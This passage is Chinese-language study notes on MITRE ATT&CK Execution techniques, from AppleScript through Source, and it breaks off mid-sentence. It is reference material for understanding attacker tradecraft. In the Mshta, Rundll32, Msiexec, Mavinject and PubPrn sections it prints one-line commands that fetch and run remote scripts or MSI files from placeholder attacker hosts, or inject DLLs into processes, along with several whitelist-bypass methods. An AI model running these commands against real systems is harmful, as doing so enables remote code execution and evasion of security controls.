[TOC]

# 执行攻击 Execution

## T1155 - AppleScript
> https://attack.mitre.org/techniques/T1155/
> 参考：https://sspai.com/post/46912

适用平台：MacOS

macOS和OS X应用程序互相发送AppleEvent消息进行进程间通信(IPC)。通过AppleScript可以为本地或远程IPC编写脚本。Osascript可以执行AppleScript和其他任何开放脚本框架(OSA)语言脚本。使用`osalang`程序可以找到安装在系统上的OSA语言列表。AppleEvent消息可以单独发送，也可以作为脚本的一部分发送。这些事件可以定位打开的窗口，发送击键，并与几乎所有本地或远程打开的应用程序进行交互。

攻击者可以使用它与打开的SSH连接进行交互，移动到远程机器，甚至向用户提供虚假的对话框。这些事件不能远程启动应用程序(尽管它们可以在本地启动)，但如果它们已经在远程运行，则可以与应用程序交互。由于这是一种脚本语言，因此可以使用它来启动更常见的技术，比如通过python启动反向shell。脚本可以从命令行通过`osascript /path/to/script`或`osascript -e“script here”`运行。

## T1191 - Microsoft连接管理器配置文件安装程序 CMSTP
> https://attack.mitre.org/techniques/T1191/
> AppLocker：https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview
> 利用手法：
> https://msitpros.com/?p=3960
> https://www.4hou.com/technology/11743.html
> https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/
> https://github.com/api0cradle/UltimateAppLockerByPassList

Microsoft连接管理器配置文件安装程序是一种用来安装Connection Manager service profiles的命令行程序b。CMSTP.exe接受INF文件作为参数，并安装用于远程访问链接的服务配置文件。
攻击者可以提供被恶意命令感染的INF文件给CMSTP.exe。类似于Regsvr32 /“Squiblydoo”，CMSTP.exe可能被滥用来从远程服务器加载和执行dll和/或COM scriptlets (SCT)。此执行也可能绕过AppLocker和其他白名单防御，因为CMSTP.exe是一个合法的、有签名的Microsoft应用程序。
CMSTP.exe还可以用来[绕过用户帐户控制](https://attack.mitre.org/techniques/T1088/)，并通过自动提升的COM接口执行来自恶意INF的任意命令。


## T1059 - 命令行接口 Command-Line Interface
> https://attack.mitre.org/techniques/T1059/

攻击者可以通过命令行接口以当前用户权限来执行系统指令、运行软件等。


## T1223 - 已编译HTML文件 Compiled HTML File
> https://attack.mitre.org/techniques/T1223/
> Microsoft HTML Help：https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk
> 利用手法 CVE-2017-8625：
> https://msitpros.com/?p=3909
> https://www.anquanke.com/post/id/86694
> https://zhuanlan.zhihu.com/p/41377249

已编译HTML文件（.chm）通常作为Microsoft HTML帮助系统的一部分。CHM文件是各种内容(如HTML文档、图像和与脚本/web相关的编程语言，如VBA、JScript、Java和ActiveX)的压缩编译。CHM内容由 [HTML Help可执行程序(hh.exe)](https://msdn.microsoft.com/zh-cn/windows/desktop/ms524405) 加载的 [IE组件](https://msdn.microsoft.com/zh-cn/windows/desktop/ms644670) 显示。

攻击者可以嵌入恶意负载到CHM文件，发送给用户，然后由用户执行触发。CHM执行还可以绕过在旧的或未打补丁的系统上的应用程序白名单，这些系统不需要通过hh.exe执行二进制文件。


## T1175 - COM和DCOM
> https://attack.mitre.org/techniques/T1175/
> 利用手法：
> https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
> https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects-part-two.html

攻击者可以利用Windows组件对象模型（Componet Object Model, COM）和分布式组件对象模型（Distributed Component Object Model, DCOM）执行本地代码，或者在内网渗透时远程执行代码。
COM是一个跨平台的、分布式的、面向对象的系统，用于创建可交互的二进制软件组件。它使独立的代码模块能够相互交互。这可能发生在单个进程或跨进程中，而分布式COM (DCOM)添加了允许跨网络远程过程调用的序列化。
“COM Object”指的是实现一个或多个接口的可执行代码部分，这些接口派生自IUnknown。每个COM对象都由唯一的二进制标识符标识。这些128位(16字节)的全局惟一标识符通常称为GUID。
* 当GUID用于标识COM对象时，它是CLSID(类标识符)。
* 当它用于标识接口时，它是IID(接口标识符)。
* 一些CLSID还具有可人为识别的等价物，叫ProgID
Windows注册表包含一组键，这些键使系统能够将CLSID映射到底层代码实现(在DLL或EXE中)，从而创建对象。


利用手法：
* 根据FireEye公布的研究结果，基本是通过Powershell获取CLSID，然后获取进程对象的开放接口。进而找到可利用的接口，用于进程注入、代码执行、无文件下载执行等。


## T1196 - 控制面板 Control Panel Items
> https://attack.mitre.org/techniques/T1196/
> https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/cc144185(v=vs.85)?redirectedfrom=MSDN
> 利用：
> https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf
> https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/
> https://unit42.paloaltonetworks.com/unit42-new-malware-with-ties-to-sunorcal-discovered/
> https://cloud.tencent.com/developer/article/1044879

Windows控制面板项是允许用户查看和调整计算机设置的实用工具。控制面板项是注册的可执行文件(.exe)或控制面板(.cpl)文件（实际上是导出CPlApplet函数的重命名的动态链接库(.dll)文件）。控制面板项可以直接从命令行执行，也可以通过应用程序编程接口(API)调用以编程方式执行，或者只需双击文件即可执行。

对手可以使用控制面板项作为执行负载来执行任意命令。恶意控制面板项目可以通过鱼叉式钓鱼附件活动或执行作为多级恶意软件的一部分。控制面板项目，特别是CPL文件，也可以绕过应用程序和/或文件扩展白名单。



## T1173 - 动态数据交换 Dynamic Data Exchange
> https://attack.mitre.org/techniques/T1173/
> ID: T1173
> Tactic: Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: API monitoring, DLL monitoring, Process monitoring, Windows Registry, Windows event logs
> Version: 1.1
>
> ---
>
> https://docs.microsoft.com/zh-cn/security-updates/securityadvisories/2017/4053440?redirectedfrom=MSDN
> https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/
> https://www.contextis.com/en/blog/comma-separated-vulnerabilities
> 利用手法：
> https://www.4hou.com/web/8216.html
> https://www.4hou.com/vulnerable/9212.html
> https://www.anquanke.com/post/id/87078
> https://www.anquanke.com/post/id/181206
> https://cloud.tencent.com/developer/article/1098319
> https://www.cnblogs.com/17bdw/p/8546380.html
> https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/
> https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee
> https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
> 实际攻击：
> https://www.anquanke.com/post/id/147334
> https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/

Windows动态数据交换(DDE)是一种用于应用程序之间一次性或连续进程间通信(IPC)的客户端-服务器协议。一旦建立了链接，应用程序就可以自主地交换由字符串、暖数据链接(数据项更改时的通知)、热数据链接(数据项更改的副本)和命令执行请求组成的事务。

对象链接和嵌入(OLE)，即在文档之间链接数据的能力，最初是通过DDE实现的。尽管已被COM取代，但DDE可能通过注册表键在Windows 10和大部分Microsoft Office 2016中启用。

对手可以使用DDE执行任意命令。带毒的Office文档可以直接或通过嵌入式文件进行钓鱼或从web下载执行，从而避免使用Visual Basic for Applications (VBA)宏。即使攻击者没有命令行执行权限，也能利用DDE。


## T1106 - 利用API执行攻击 Execution through API
> https://attack.mitre.org/techniques/T1106/
> ID: T1106
> Tactic: Execution
> Platform: Windows
> Permissions Required: User, Administrator, SYSTEM
> Data Sources: API monitoring, Process monitoring
> Contributors: Stefan Kanthak
> Version: 1.0
>
> ---
> https://skanthak.homepage.t-online.de/verifier.html

对抗工具可以直接使用Windows应用程序编程接口(API)来执行二进制文件。像Windows API [CreateProcess](https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa?redirectedfrom=MSDN)这样的函数将允许程序和脚本使用正确的路径和参数启动其他进程。
可用于执行二进制文件的其他Windows API调用包括:

* CreateProcessA() and CreateProcessW()
* CreateProcessAsUserA() and CreateProcessAsUserW()
* CreateProcessInternalA() and CreateProcessInternalW()
* CreateProcessWithLogonW(), CreateProcessWithTokenW()
* LoadLibraryA() and LoadLibraryW()
* LoadLibraryExA() and LoadLibraryExW()
* LoadModule()
* LoadPackagedLibrary()
* WinExec()
* ShellExecuteA() and ShellExecuteW()
* ShellExecuteExA() and ShellExecuteExW()


## T1129 - 利用模块加载执行攻击 Execution through Module Load
> https://attack.mitre.org/techniques/T1129/
> ID: T1129
> Tactic: Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: API monitoring, DLL monitoring, File monitoring, Process monitoring
> Contributors: Stefan Kanthak
> Version: 1.0
>
> ---
> https://www.cnblogs.com/dubingsky/archive/2009/06/25/1510940.html


Windows模块加载器能够用来从任意本地路径和任意通用命名约定(Universal Naming Convention, UNC)网络路径加载dll。此功能作为Windows本机API的一部分，放置在在NTDLL.dll中。利用Win32 API的CreateProcess()、LoadLibrary()等函数调用。
模块加载器可以通过以下方法加载DLL：
* 指定IMPORT目录中的（完全限定或相对）DLL路径名；
* 通过XPORT转发到另一个DLL，该DLL具有（完全限定或相对）路径名（但不带扩展名）；
* NTFS联结或symlink program.exe.local使用目录的完全限定或相对路径名，该目录包含在IMPORT目录中指定的DLL或转发的EXPORT；
* 嵌入或外部“应用程序清单”中的`<file name =“ filename.extension” loadFrom =“fully-qualified or relative pathname”>`。 文件名是指IMPORT目录中的条目或转发的EXPORT。

攻击者可以使用此功能作为在系统上执行任意代码的方式。

## T1203 - 通过客户端执行攻击 Exploitation for Client Execution
> https://attack.mitre.org/techniques/T1203/
> ID: T1203
> Tactic: Execution
> Platform: Linux, Windows, macOS
> System Requirements: Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise.
> Data Sources: Anti-virus, System calls, Process monitoring
> Supports Remote:  Yes
> Version: 1.0

利用软件漏洞，来获取系统的访问权限，执行任意代码。现有几种利用方法：
* 基于浏览器的攻击

网络浏览器是一个常见的目标，通过[水坑式攻击](https://attack.mitre.org/techniques/T1189)和[鱼叉式钓鱼链接](https://attack.mitre.org/techniques/T1192/)。终端用户可能会因为浏览某些恶意链接而受到攻击，这些攻击通常不需要用户的操作就可以执行。

* Office应用

常见的office和办公应用程序(如Microsoft office)也会通过鱼叉式钓鱼附件、鱼叉式钓鱼链接和鱼叉式钓鱼服务。恶意文件将直接作为附件或通过链接下载。这要求用户打开文档或文件以运行攻击。

* 公共的第三方应用

在目标网络中部署的常见软件或作为其一部分的其他应用程序也可以用于攻击。企业环境中常见的Adobe Reader和Flash之类的应用程序经常受到试图获得系统访问权限的攻击者的攻击。 根据软件和漏洞的性质，可能会在浏览器中利用某些漏洞，或者要求用户打开文件。 例如，一些Flash利用已作为Microsoft Office文档中的对象提供。



## T1061 - 图形化用户界面 Graphical User Interface
> https://attack.mitre.org/techniques/T1061/
> ID: T1061
> Tactic: Execution
> Platform: Linux, macOS, Windows
> Permissions Required: User, Administrator, SYSTEM
> Data Sources: File monitoring, Process monitoring, Process command-line parameters, Binary file metadata
> Supports Remote:  Yes
> Version: 1.0


图形用户界面(GUI)是与操作系统交互的一种常见方式。攻击者可以通过远程交互会话（如RDP）使用系统的GUI进行操作，而不是通过命令行界面。
利用GUI可以搜索信息并通过鼠标双击事件、Windows Run命令[1]或其他可能难以监视的交互来执行文件。


## T1118 - InstallUtil
> https://attack.mitre.org/techniques/T1118/
> ID: T1118
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: Process monitoring, Process command-line parameters
> Defense Bypassed: Process whitelisting, Digital Certificate Validation
> Contributors: Casey Smith; Travis Smith, Tripwire
> Version: 1.2
>
> ---
> https://www.jianshu.com/p/e895de848907
> https://micro8.gitbook.io/micro8/contents-1/71-80/72-ji-yu-bai-ming-dan-installutil.exe-zhi-hang-payload-di-er-ji
> https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool?redirectedfrom=MSDN
> https://lolbas-project.github.io/lolbas/Binaries/Installutil/

InstallUtil是一个命令行实用程序，它允许通过执行. net二进制文件中指定的特定安装程序组件来安装和卸载资源。InstallUtil位于Windows系统的.NET目录中:`C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe` 和`C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe`。InstallUtil是由微软数字签名的。

攻击者可以使用InstallUtil通过受信任的Windows实用程序代理执行代码。InstallUtil还可以通过在二进制文件中使用属性来绕过白名单，这些属性执行带有属性`[System.ComponentModel.RunInstaller(true)]`修饰的类。

## T1152 - Launchctl
> https://attack.mitre.org/techniques/T1152/
> ID: T1152
> Tactic: Defense Evasion, Execution, Persistence
> Platform: macOS
> Permissions Required: User, Administrator
> Data Sources: File monitoring, Process monitoring, Process command-line parameters
> Defense Bypassed: Application whitelisting, Process whitelisting, Whitelisting by file name or path
> Version: 1.0
>
> ---
> https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/

Launchctl控制macOS launchd进程，该进程处理启动代理和启动守护进程，但可以执行其他命令或程序本身。Launchctl支持在命令行上、交互地、甚至从标准输入重定向子命令。通过加载或重新加载启动代理或启动守护进程，对手可以安装持久性或执行他们所做的更改。
从launchctl运行一个命令的样式如下：`launchctl submit -l -- /Path/to/thing/to/execute "arg" "arg" "arg"`
加载、卸载或重新加载启动代理程序或启动守护进程可能需要提升权限。如果攻击者可以使用launchctl进程，则攻击者可以用这个功能来执行代码，甚至可以绕过白名单。



## T1168 - 本地工作调度 Local Job Scheduling
> https://attack.mitre.org/techniques/T1168/
> ID: T1168
> Tactic: Persistence, Execution
> Platform: Linux, macOS
> Permissions Required: Administrator, User, root
> Data Sources: File monitoring, Process monitoring
> Contributors: Anastasios Pingios
> Version: 1.0
>
> ---
> https://www.thesafemac.com/new-signed-malware-called-janicab/
> https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
> https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/
> https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html

在Linux和MacOS系统中，有多种方式支持创建预定的和定期的后台工作：[cron](https://linux.die.net/man/5/crontab)、[at](https://linux.die.net/man/1/at)、[launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html)。不同于Windows中的[计划任务](https://attack.mitre.org/techniques/T1053/)，除非结合已建立的远程会话（如SSH）使用，否则无法执行基于Linux的工作计划。

* Cron

系统范围的Cron任务通过修改`/etc/crontab`文件、`/etc/cronc.d`目录或其他Cron守护进程支持的位置来安装。每个用户的Cron任务是使用crontab和特定格式的crontab文件来安装。在macOS和Linux系统都适用。
这些方法允许命令或脚本在后台以特定的周期性间隔执行，而无需用户交互。攻击者可以使用任务调度在系统启动时或在持久性调度的基础上执行程序，作为横向移动的一部分执行执行，获得root特权或在特定帐户的上下文下运行流程。

* at

at程序是基于POSIX的系统（包括macOS和Linux）在调度程序或脚本作业以在以后的日期和/或时间执行的另一种方式，也可以用于相同的目的。

* launchd

每个启动的作业都由不同配置属性列表（plist）文件描述。除了有一个名为StartCalendarInterval的附加键以及时间值字典外，plist与[启动守护程序](https://attack.mitre.org/techniques/T1160/)或[启动代理](https://attack.mitre.org/techniques/T1159/)类似的。在macOS和Linux系统都适用

## T1177 - LSASS Driver
> https://attack.mitre.org/techniques/T1177/
> ID: T1177
> Tactic: Execution, Persistence
> Platform: Windows
> Permissions Required: Administrator, SYSTEM
> Data Sources: API monitoring, DLL monitoring, File monitoring, Kernel drivers, Loaded DLLs, Process monitoring
> Contributors: Vincent Le Toux
> Version: 1.0
>
> ---
> https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN
> https://sakuxa.com/2019/04/06/windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/


Windows安全子系统是一组用于管理和实施计算机或域安全策略的组件。本地安全机构（Local Security Authority，LSA）是负责本地安全策略和用户身份验证的主要组件。LSA包含多个与其他各种安全功能相关联的动态链接库，所有这些动态链接库都在LSA子系统服务(LSASS) `lsass.exe`进程中运行。

攻击者可以以`lsass.exe`驱动程序为目标来获得执行权限和持久性。通过替换或添加非法驱动程序（如[DLL Side-Loading](https://attack.mitre.org/techniques/T1073/)或[DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038/)），攻击者可以实现由连续的LSA操作触发的任意代码执行。


## T1170 - Mshta
> https://attack.mitre.org/techniques/T1170/
> ID: T1170
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: Process monitoring, Process command-line parameters
> Defense Bypassed: Application whitelisting, Digital Certificate Validation
> Contributors: Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
> Version: 1.2
>
> ---
> https://en.wikipedia.org/wiki/HTML_Application
> https://docs.microsoft.com/en-us/previous-versions//ms536471(v=vs.85)?redirectedfrom=MSDN
> https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf
> https://redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/
> https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
> https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/
> https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html
> https://lolbas-project.github.io/lolbas/Binaries/Mshta/
> https://www.cnblogs.com/backlion/p/10491616.html

Mshta.exe是用来执行Microsoft HTML Applications（HTA）的实用程序。HTAs是独立的应用程序，使用Internet Explorer相同的模型和技术执行，但独立于浏览器之外。
攻击者可以使用mshta.exe通过受信任的Windows实用程序代理执行恶意的.hta文件、Javascript或VBScript。有几个不同类型的威胁的例子，它们利用mshta.exe进行初始妥协和执行代码
文件可以由mshta.exe通过内联脚本执行：
`mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`
也可以通过URL执行：
`mshta http[:]//webserver/payload[.]hta`


Mshta.exe可用于绕过不考虑其潜在用途的应用程序白名单解决方案。由于mshta.exe在Internet Explorer的安全内容之外执行，所以它也绕过了浏览器的安全设置。


## T1086 - PowerShell
> https://attack.mitre.org/techniques/T1086/
> ID: T1086
> Tactic: Execution
> Platform: Windows
> Permissions Required: User, Administrator
> Data Sources: PowerShell logs, Loaded DLLs, DLL monitoring, Windows Registry, File monitoring, Process monitoring, Process command-line parameters
> Supports Remote:  Yes
> Contributors: Praetorian
> Version: 1.1
>
> ---
> https://docs.microsoft.com/zh-cn/powershell/
> http://www.sixdub.net/?p=367
> https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/
> https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/


PowerShell是Windows中一种交互式命令行界面和脚本环境。攻击者可以使用PowerShell执行许多操作，包括发现信息和执行代码。例如，`Start-Process cmdlet`可用于运行可执行文件，`Invoke-Command cmdlet`可在本地或远程计算机上运行命令。
PowerShell还可以用于从Internet下载和运行可执行文件，这些可执行文件可以在磁盘或内存中执行，而不需要接触磁盘。
使用PowerShell连接远程系统需要管理员权限。
有许多基于powershell的攻击测试工具可用，包括[Empire](https://attack.mitre.org/software/S0363/)、[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)和[PSAttack](https://github.com/jaredhaight/PSAttack)。

PowerShell命令/脚本也可以在不直接调用`PowerShell.exe`的情况下通过PowerShell的底层`System.Management.Automation`接口执行，接口由.NET Framework和Windows公共语言接口(CLI)编译而成。


## T1121 - Regsvcs/Regasm
> https://attack.mitre.org/techniques/T1121/
> ID: T1121
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User, Administrator
> Data Sources: Process monitoring, Process command-line parameters
> Defense Bypassed: Process whitelisting, Digital Certificate Validation
> Contributors: Casey Smith
> Version: 1.2
>
> ---
> https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool?redirectedfrom=MSDN
> https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool?redirectedfrom=MSDN
> https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
> https://lolbas-project.github.io/lolbas/Binaries/Regasm/
> https://www.4hou.com/technology/5642.html
> https://www.jianshu.com/p/e16ba705850e

Regsvcs和Regasm是用于注册.NET组件对象模型(COM)程序集的Windows命令行实用程序。两者都是由微软数字签名的。
攻击者可以使用Regsvcs和Regasm通过受信任的Windows实用程序代理执行代码。这两个程序可以通过使用二进制文件中的属性来指定应该在注册或取消注册之前运行的代码，从而绕过白名单:`[ComRegisterFunction]`或`[ComUnregisterFunction]`。即使进程在权限不足的情况下，具有注册和取消注册属性的代码也会被执行。


## T1117 - Regsvr32
> https://attack.mitre.org/techniques/T1117/
> ID: T1117
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User, Administrator
> Data Sources: Loaded DLLs, Process monitoring, Windows Registry, Process command-line parameters
> Defense Bypassed: Process whitelisting, Anti-virus, Digital Certificate Validation
> Contributors: Casey Smith
> Version: 1.2
>
> ---
> https://support.microsoft.com/en-us/kb/249873
> https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
> https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/
> https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html
> https://redcanary.com/blog/atomic-red-team-testing/

Regsvr32.exe是一个命令行程序，用于在Windows系统上注册和注销对象链接和嵌入控件，包括动态链接库（DLL）。也可以用来执行任意二进制文件。
攻击者可以利用此程序来执行任意代码，从而避开安全检测。Regsvr32.exe也是一个Microsoft签名的二进制文件。
Regsvr32.exe也可以使用功能加载COM脚本以在用户权限下执行DLL，从而专门绕过进程白名单。 由于regsvr32.exe具有网络和代理功能，因此可以加载URL作为参数，来读取外部Web服务器上的文件。此方法对注册表没有任何更改，因为COM对象实际上并未注册，仅被执行。 这种技术的变种通常称为“ Squibledoo”攻击，并已用于针对政府中。

Regsvr32.exe还可以通过[COM劫持](https://attack.mitre.org/techniques/T1122/)注册用于建立Persistence的COM对象。


## T1085 - Rundll32
> https://attack.mitre.org/techniques/T1085/
> ID: T1085
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: File monitoring, Process monitoring, Process command-line parameters, Binary file metadata
> Defense Bypassed: Anti-virus, Application whitelisting, Digital Certificate Validation
> Contributors: Ricardo Dias; Casey Smith
> Version: 1.1
>
> ---
> https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf
> https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/

rundll32.exe程序可以用来执行任意二进制文件。攻击者可以利用此功能来执行代码，来避免安全监测。
rundll32.exe可以通过未公布用法的shell32.dll函数`Control_RunDLL` 和`Control_RunDLLAsUser`来执行.cpl文件。双击.cpl文件也会导致rundll32.exe执行。
rundll32也能用来执行脚本（如JavaScript）：
`rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"`

## T1053 - 调度任务 Scheduled Task
> https://attack.mitre.org/techniques/T1053/
> ID: T1053
> Tactic: Execution, Persistence, Privilege Escalation
> Platform: Windows
> Permissions Required: Administrator, SYSTEM, User
> Effective Permissions: SYSTEM, Administrator, User
> Data Sources: File monitoring, Process monitoring, Process command-line parameters, Windows event logs
> Supports Remote:  Yes
> CAPEC ID: CAPEC-557
> Contributors: Prashant Verma, Paladion; Leo Loobeek, @leoloobeek; Travis Smith, Tripwire; Alain Homewood, Insomnia Security
> Version: 1.1

如at和schtasks之类的实用程序，以及Windows Task Scheduler，都可用于计划在某个日期和时间执行的程序或脚本。只要通过身份验证，使用RPC，打开文件和打印机共享，还可以在远程系统上安排任务。在远程系统上计划任务通常需要成为远程系统上Administrators组的成员。
攻击者可以使用任务调度在系统启动时或在预定的基础上执行程序，以实现持久性，将远程执行作为横向移动的一部分，以获得系统特权，或在指定帐户的范围中运行进程。


## T1064 - 脚本 Scripting
> https://attack.mitre.org/techniques/T1064/
> ID: T1064
> Tactic: Defense Evasion, Execution
> Platform: Linux, macOS, Windows
> Permissions Required: User
> Data Sources: Process monitoring, File monitoring, Process command-line parameters
> Defense Bypassed: Process whitelisting, Data Execution Prevention, Exploit Prevention
> Version: 1.0
>
> ---
> https://www.uperesia.com/analyzing-malicious-office-documents

关键词：
脚本自动化、宏病毒、脚本框架（MSF、PowerSploit等）


攻击者可以使用脚本来辅助操作，自动执行多个人工操作。脚本对于加速操作任务和减少访问关键资源所需的时间很有用。一些脚本语言可以通过在API级别直接与操作系统交互，而不是调用其他程序来绕过进程监视机制。用于Windows的常见脚本语言包括VBScript和PowerShell，也可以采用命令行批处理脚本的形式。
脚本可以作为宏嵌入到Office文档中，用于钓鱼附件被打开时，运行这些宏。恶意嵌入宏是一种替代的执行方式，而不是通过客户端执行来利用软件，在客户端执行中，对手将依赖于允许或用户将接受的宏来激活它们。
现在有许多流行的攻击框架，它们使用脚本的形式来满足安全测试人员和对手的需要。Metasploit[1]、Veil[2]和PowerSploit[3]是三个在渗透测试人员中流行的用于渗透和后渗透操作的实例，其中包括许多用于ByPass的特性。已知有些攻击者使用PowerShell。


## T1035 - 利用服务执行攻击 Service Execution
> https://attack.mitre.org/techniques/T1035/
> ID: T1035
> Tactic: Execution
> Platform: Windows
> Permissions Required: Administrator, SYSTEM
> Data Sources: Windows Registry, Process monitoring, Process command-line parameters
> Supports Remote:  Yes
> Version: 1.0

攻击者可以通过与Windows服务交互的方法(如服务控制管理器)执行二进制、命令或脚本。这可以通过创建新服务或修改现有服务来实现。此技术是在持久化或提取时与[新服务](https://attack.mitre.org/techniques/T1050/)和[修改现有服务](https://attack.mitre.org/techniques/T1031/)一起使用的。

## T1218 - 利用注册的二进制文件代理执行 Signed Binary Proxy Execution
> https://attack.mitre.org/techniques/T1218
> ID: T1218
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: Process monitoring, Process command-line parameters
> Defense Bypassed: Application whitelisting, Digital Certificate Validation
> Contributors: Nishan Maharjan, @loki248; Hans Christoffer Gaardløs; Praetorian
> Version: 2.0
>
> ---
> Msiexec.exe
> https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
> https://unit42.paloaltonetworks.com/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/
> https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/
> Mavinject.exe
> https://twitter.com/gn3mes1s/status/941315826107510784
> SyncAppvPublishingServer.exe
> https://twitter.com/monoxgas/status/895045566090010624
> https://www.4hou.com/system/21649.html
> Odbcconf.exe
> https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
> https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/
> https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/
> Others
> https://github.com/api0cradle/UltimateAppLockerByPassList


使用可信数字证书签名的二进制文件可以在受数字签名验证保护的Windows系统上执行。Windows安装中默认的几个Microsoft签名二进制文件可用于代理执行其他文件。这种行为可能被对手滥用来执行恶意文件，从而绕过系统上的应用程序白名单和签名验证。现有检测技术尚未考虑这种代理执行方法。

> Msiexec.exe

Msiexec.exe是Windows安装程序的命令行窗口实用程序。对手可以使用msiec .exe启动恶意的MSI文件来执行代码。对手可以使用它来启动本地或网络可访问的MSI文件。msiec .exe也可以用来执行dll。
```powershell
msiexec.exe /q /i "C:\path\to\file.msi"
msiexec.exe /q /i http[:]//site[.]com/file.msi
msiexec.exe /y "C:\path\to\file.dll"
```

> Mavinject.exe

Mavinject.exe是一个允许执行代码的Windows实用程序。可用于将DLL输入到正在运行的进程中。
```powershell
"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>
C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>
```

> SyncAppvPublishingServer.exe/vbs

SyncAppvPublishingServer.exe/vbs来运行PowerShell脚本，而不需要执行PowerShell .exe。
![822ec3096773200528731cab7e130996.png](en-resource://database/8444:1)

> Odbcconf.exe

Odbcconf.exe是一个Windows实用程序，允许配置ODBC驱动程序和数据源名称。该程序可以使用REGSVR选项来执行DLL，与[Regsvr32](https://attack.mitre.org/techniques/T1117/)相同效果。
```powershell
odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}
```

## T1216 - 利用注册的脚本文件代理执行 Signed Script Proxy Execution
> https://attack.mitre.org/techniques/T1216/
> ID: T1216
> Tactic: Defense Evasion, Execution
> Platform: Windows
> Permissions Required: User
> Data Sources: Process monitoring, Process command-line parameters
> Defense Bypassed: Application whitelisting, Digital Certificate Validation
> Contributors: Praetorian
> Version: 1.0
>
> ---
> https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
> others
> https://github.com/api0cradle/UltimateAppLockerByPassList

使用可信证书签名的脚本可用于代理执行恶意文件。这种行为可能会绕过签名验证限制和不考虑使用这些脚本的应用程序白名单解决方案。

> PubPrn.vbs

可用于从远程站点代理执行脚本。
```powershell
cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png
```

## T1153 - Source
> https://attack.mitre.org/techniques/T1153/
> ID: T1153
> Tactic: Execution
> Platform: Linux, macOS
> Permissions Required: User
> Data Sources: Process monitoring, File monitoring, Process command-line parameters
> Version: 1.1
>
> ---
> https://ss64.com/bash/source.html

`source`命令用于加载函数到当前shell或在当前窗口执行文件。这个内置命令有两种运行方式：
